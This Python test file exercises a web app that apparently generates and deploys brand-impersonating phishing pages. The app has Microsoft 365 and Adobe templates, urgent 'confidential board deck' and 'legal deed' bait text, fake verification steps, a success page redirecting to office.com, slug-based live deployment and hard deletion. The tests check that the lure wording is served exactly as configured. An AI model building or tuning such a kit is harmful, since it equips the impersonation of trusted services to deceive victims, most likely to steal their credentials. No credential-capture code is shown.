import json
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

def test_features():
    from main import app
    client = app.test_client()
    with client.session_transaction() as sess:
        sess['authenticated'] = True
        sess['username'] = 'admin'
        sess['role'] = 'admin'

    print("=== TEST 1: Preview Pre-land with custom text ===")
    preland_payload = {
        "template_name": "Microsoft 365",
        "config": {
            "title": "Custom Review Requested",
            "desc": "Please inspect this confidential Q4 board packet immediately.",
            "doc_name": "Q4-Board-Review.pdf",
            "doc_badge": "PDF",
            "doc_meta": "Confidential Board Deck · 12 MB",
            "btn_label": "Review Board Deck Now",
            "status_tag": "Microsoft 365 · Board Confidential",
            "show_bg_image": True,
            "blur": 15
        }
    }
    r = client.post("/api/lg/preview/preland", json=preland_payload)
    assert r.status_code == 200, f"Preview preland failed: {r.status_code}"
    html = r.get_json().get('html', '')
    assert "Custom Review Requested" in html, "Custom title not found in preland HTML"
    assert "Please inspect this confidential Q4 board packet" in html, "Custom desc not found"
    assert "Q4-Board-Review.pdf" in html, "Custom doc_name not found"
    assert "Review Board Deck Now" in html, "Custom btn_label not found"
    assert "Board Confidential" in html, "Custom status_tag not found"
    print("PASS: Preland preview correctly rendered custom text and 3D elevation!")

    print("\n=== TEST 2: Preview Landing Mode R (Steps Show / Hide) ===")
    r_steps_on = client.post("/api/lg/preview/landing", json={
        "template_name": "Adobe",
        "mode": "R",
        "config": {
            "landing_mode": "R",
            "show_mode_r_steps": True,
            "mode_r_title": "Executive Review Stage",
            "mode_r_step1": "Passkey Auth",
            "mode_r_step2": "Sign NDA",
            "mode_r_step3": "Complete"
        }
    })
    assert r_steps_on.status_code == 200
    html_on = r_steps_on.get_json().get('html', '')
    assert "Passkey Auth" in html_on, "Step 1 not found when show_mode_r_steps is True"
    assert "Sign NDA" in html_on, "Step 2 not found when show_mode_r_steps is True"

    r_steps_off = client.post("/api/lg/preview/landing", json={
        "template_name": "Adobe",
        "mode": "R",
        "config": {
            "landing_mode": "R",
            "show_mode_r_steps": False,
            "mode_r_title": "Executive Review Stage",
            "mode_r_step1": "Passkey Auth"
        }
    })
    assert r_steps_off.status_code == 200
    html_off = r_steps_off.get_json().get('html', '')
    assert "Passkey Auth" not in html_off, "Step 1 still found when show_mode_r_steps is False"
    print("PASS: Mode R show/hide steps toggle works seamlessly!")

    print("\n=== TEST 3: Preview Success (Background Show / Hide) ===")
    succ_bg_on = client.post("/api/lg/preview/success", json={
        "template_name": "Microsoft 365",
        "config": {
            "show_page_bg_image": True,
            "card_title": "Access Granted",
            "body_text": "Your account is verified."
        }
    })
    assert succ_bg_on.status_code == 200
    assert "data:image/jpeg;base64" in succ_bg_on.get_json().get('html', '')

    succ_bg_off = client.post("/api/lg/preview/success", json={
        "template_name": "Microsoft 365",
        "config": {
            "show_page_bg_image": False,
            "card_title": "Access Granted",
            "body_text": "Your account is verified."
        }
    })
    assert succ_bg_off.status_code == 200
    assert "data:image/jpeg;base64" not in succ_bg_off.get_json().get('html', '')
    print("PASS: Success background show/hide toggle works correctly!")

    print("\n=== TEST 4: Deploy Link with Custom Template Content & Verification ===")
    test_slug = "test-custom-verify-slug-99"
    deploy_payload = {
        "name": "Customized Q4 Deployment",
        "domain": "127.0.0.1:5000",
        "subdomain": "",
        "path": test_slug,
        "preland_template_name": "Microsoft 365",
        "preland_enabled": True,
        "landing_template_name": "Microsoft 365",
        "success_template_name": "Microsoft 365",
        "landing_mode": "R",
        "success_url": "https://www.office.com/",
        "languages": ["en"],
        "config": {
            "title": "Custom Deployed Title",
            "desc": "Custom deployed description text for the target user.",
            "doc_name": "Custom-Contract-Deed.docx",
            "doc_badge": "DOCX",
            "doc_meta": "Encrypted Legal Deed · 4.8 MB",
            "btn_label": "Review Legal Deed",
            "btn_color": "#0078D4",
            "foot1": "Authorized Legal Dept Only",
            "foot2": "Confidential Transmission",
            "show_bg_image": True,
            "blur": 8
        },
        "landing_config": {
            "landing_mode": "R",
            "mode_r_title": "Review Legal Document",
            "show_mode_r_steps": True,
            "mode_r_step1": "Legal Verify",
            "mode_r_step2": "Sign Deed",
            "mode_r_step3": "Archive",
            "mode_r_doc_name": "Custom-Contract-Deed.docx",
            "mode_r_badge": "DOCX",
            "mode_r_doc_meta": "Encrypted Legal Deed · 4.8 MB",
            "mode_r_desc": "Please complete signature verification to finalize legal title."
        },
        "success_config": {
            "card_title": "Deed Successfully Verified",
            "body_text": "Your deed verification was recorded successfully.",
            "show_page_bg_image": False
        }
    }
    dep_res = client.post("/api/lg/deployments", json=deploy_payload)
    assert dep_res.status_code in (200, 201), f"Deploy create failed: {dep_res.status_code} {dep_res.data.decode()}"
    dep_data = dep_res.get_json()
    did = dep_data.get('id')
    assert did, "No deployment ID returned"

    # Activate
    act_res = client.post(f"/api/lg/deployments/{did}/deploy")
    assert act_res.status_code == 200, f"Activation failed: {act_res.status_code} {act_res.data.decode()}"

    # Verify Pre-land served HTML
    pre_hit = client.get(f"/lp/{test_slug}")
    assert pre_hit.status_code == 200
    pre_text = pre_hit.data.decode()
    assert "Custom Deployed Title" in pre_text, "Preland did not preserve custom title!"
    assert "Custom deployed description text" in pre_text, "Preland did not preserve custom desc!"
    assert "Custom-Contract-Deed.docx" in pre_text, "Preland did not preserve custom doc_name!"
    assert "Review Legal Deed" in pre_text, "Preland did not preserve custom btn_label!"
    assert "Authorized Legal Dept Only" in pre_text, "Preland did not preserve custom footer!"
    print("PASS: Pre-land deployed link served with EXACT custom modifications!")

    # Verify Landing served HTML
    land_hit = client.get(f"/lp/{test_slug}/l")
    assert land_hit.status_code == 200
    land_text = land_hit.data.decode()
    assert "Review Legal Document" in land_text, "Landing did not preserve mode_r_title!"
    assert "Legal Verify" in land_text, "Landing did not preserve mode_r_step1!"
    assert "Sign Deed" in land_text, "Landing did not preserve mode_r_step2!"
    print("PASS: Landing page served with EXACT custom Mode R modifications!")

    print("\n=== TEST 5: Batch Delete Deployment ===")
    del_res = client.post("/api/lg/deployments/batch-delete", json={"ids": [did], "hard": True})
    assert del_res.status_code == 200, f"Batch delete failed: {del_res.status_code} {del_res.data.decode()}"
    assert del_res.get_json().get('success') is True, "Batch delete returned success=False"

    # Verify it is deleted
    del_check = client.get(f"/api/lg/deployments/{did}")
    assert del_check.status_code == 404, "Deployment still exists after batch delete!"
    print("PASS: Batch delete verified successfully!")

    print("\nALL FEATURE TESTS PASSED 100% SUCCESSFULLY!")

if __name__ == '__main__':
    test_features()
